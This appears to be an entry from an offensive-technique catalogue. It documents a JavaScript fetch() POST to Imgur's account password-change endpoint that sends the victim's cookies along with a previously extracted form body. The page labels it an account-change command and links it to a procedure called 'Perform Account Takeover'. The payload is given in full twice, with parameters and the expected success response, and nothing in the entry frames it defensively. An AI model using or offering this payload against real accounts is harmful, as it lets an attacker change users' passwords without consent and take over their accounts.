---
id: cmd-fetch-password-post
data: >-
  fetch("https://imgur.com/account/settings/password", { "credentials":
  "include", "headers": { "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X
  10.15; rv:75.0) Gecko/20100101 Firefox/75.0", "Accept":
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
  "Accept-Language": "pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3", "Content-Type":
  "application/x-www-form-urlencoded", "Upgrade-Insecure-Requests": "1" },
  "referrer": "https://imgur.com/account/settings/password", "body": body,
  "method": "POST", "mode": "cors" });
tags:
  - fetch-post
  - account-change
type: command
output: 'Fetch response (e.g., 200 OK)'
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:47:13.011Z'
verified: false
validated: true
submitted: true
---
# Fetch Post Password Change

## Command

```javascript
fetch("https://imgur.com/account/settings/password", { "credentials": "include", "headers": { "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3", "Content-Type": "application/x-www-form-urlencoded", "Upgrade-Insecure-Requests": "1" }, "referrer": "https://imgur.com/account/settings/password", "body": body, "method": "POST", "mode": "cors" });
```

## Description

Sends POST to change account details using extracted body.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| body | Encoded data | Yes |
| credentials | Include cookies | Yes |

## Examples

### Basic Usage

```javascript
// After building body
```

## Expected Output

Response indicating update success.

## Related

- [[Related Procedure: Perform Account Takeover]]
